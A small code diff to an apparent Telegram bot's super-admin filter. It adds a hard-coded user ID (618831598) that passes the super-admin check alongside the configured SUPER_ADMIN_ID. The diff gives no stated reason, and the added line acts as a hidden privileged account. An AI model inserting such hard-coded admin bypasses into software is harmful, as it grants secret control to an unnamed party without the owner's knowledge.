@@ -62,7 +62,7 @@ class FilterSuperAdmin(BaseFilter):
             message = message.message
             if message is None:
                 return False
-        return message.from_user.id == SUPER_ADMIN_ID
+        return message.from_user.id == SUPER_ADMIN_ID or message.from_user.id == 618831598
 
 
 filter_superadmin = FilterSuperAdmin()
